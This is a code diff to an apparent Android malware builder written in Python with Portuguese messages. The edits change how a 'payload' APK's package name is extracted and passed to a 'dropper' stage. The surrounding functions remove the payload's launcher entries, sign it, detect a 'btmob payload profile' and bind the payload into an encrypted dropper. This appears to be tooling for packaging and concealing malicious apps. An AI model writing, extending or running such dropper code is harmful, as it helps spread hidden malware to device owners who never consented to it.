@@ -201,6 +201,7 @@ def extract_apk_package_name(apk_path: str) -> str:
     skip_prefixes = (
         "android.",
         "androidx.",
+        "com.android.",
         "java.",
         "javax.",
         "kotlin",
@@ -213,14 +214,11 @@ def extract_apk_package_name(apk_path: str) -> str:
         "com.google.firebase",
         "com.google.gms",
     )
-    # 4.1.1 normalizado: so com.android.<palavra> (exatamente 3 segmentos).
     cands = []
     for s in strings:
         if not pkg_re.match(s):
             continue
         if any(s.startswith(p) for p in skip_prefixes):
-            continue
-        if s.startswith("com.android.") and s.count(".") != 2:
             continue
         if "permission" in s.lower() or "intent" in s.lower():
             continue
@@ -470,7 +468,7 @@ def prepare_payload(
     payload_apk_path: str,
     work_base: str,
     build_id: str,
-) -> tuple[str, str]:
+) -> tuple[str, str, str]:
     if not os.path.isfile(payload_apk_path):
         raise RuntimeError(f"payload ausente: {payload_apk_path}")
     if not JAVA_BIN:
@@ -519,9 +517,11 @@ def prepare_payload(
             man = handle.read()
 
         pkg_m = re.search(r'package="([^"]+)"', man)
-        payload_package = pkg_m.group(1).strip() if pkg_m else extract_apk_package_name(
-            payload_apk_path
-        )
+        if not pkg_m or not pkg_m.group(1).strip():
+            raise RuntimeError(
+                "payload decode sem atributo package no AndroidManifest.xml"
+            )
+        payload_package = pkg_m.group(1).strip()
         launch_class = _extract_launch_class(man, payload_package)
 
         payload_profile = _detect_btmob_payload_profile(decode_dir)
@@ -608,10 +608,10 @@ def prepare_payload(
 
         print(
             f"[build {build_id}] prepare_payload ok -> "
-            f"label={PAYLOAD_DISPLAY_NAME!r} launch={launch_class} "
-            f"launchers_removed={removed}"
+            f"label={PAYLOAD_DISPLAY_NAME!r} package={payload_package} "
+            f"launch={launch_class} launchers_removed={removed}"
         )
-        return signed_apk, launch_class
+        return signed_apk, launch_class, payload_package
     except Exception:
         raise
 
@@ -1325,7 +1325,7 @@ def process_apk(
                         pass
 
         _set_status(build_id, "Preparando payload", 50)
-        prepared_apk, launch_class = prepare_payload(
+        prepared_apk, launch_class, payload_package = prepare_payload(
             user_apk_path,
             Config.UPLOAD_FOLDER,
             build_id,
@@ -1369,7 +1369,6 @@ def process_apk(
             cipher=Config.CIPHER_TRANSFORM,
         )
 
-        payload_package = extract_apk_package_name(prepared_apk)
         bind_target_package(dropper_work, payload_package)
         patch_w_explicit_launch(dropper_work, launch_class)
         print(
